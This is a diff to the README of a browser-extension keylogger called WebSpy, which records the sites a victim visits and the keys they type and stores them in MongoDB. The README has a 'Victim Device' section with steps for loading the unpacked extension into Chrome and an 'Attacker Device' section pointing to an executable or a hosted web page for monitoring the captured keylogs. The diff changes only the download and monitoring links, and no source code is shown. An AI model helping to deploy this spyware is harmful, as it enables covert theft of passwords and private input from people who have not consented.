@@ -11,12 +11,12 @@ A Browser Extension to detect the site and key strokes, store the data in mongoD
 
 ## Installation
 ### Victim Device:
-  - Download the extension zip file [extn.zip](https://github.com/3rr0r-505/WebSpy/raw/main/extn.zip) and extract the zip file.
+  - Download the extension zip file [extn.zip](https://github.com/3rr0r-505/WebSpy/releases/tag/v1.0) and extract the zip file.
   - Load the extension into Chrome:-
       - Open Google Chrome and go to `chrome://extensions/`.
       - Enable `Developer Mode` by toggling the switch in the top right corner.
       - Click on the "Load unpacked" button and select the `.extn` directory.
 ### Attacker Device :
    - ### 🌐Web Interface
-   - Install [W3Blogger.exe](https://github.com/3rr0r-505/KeySpy/raw/main/exe/W3Blogger/W3Blogger_v1.1.exe) and launch it. Then go to the browserlog section to monitor the Keylogs along with the sites.
+   - Visit [w3blogger.onrender.com](https://w3blogger.onrender.com/) & go to the browserlog section to monitor the Keylogs along with the sites.
 
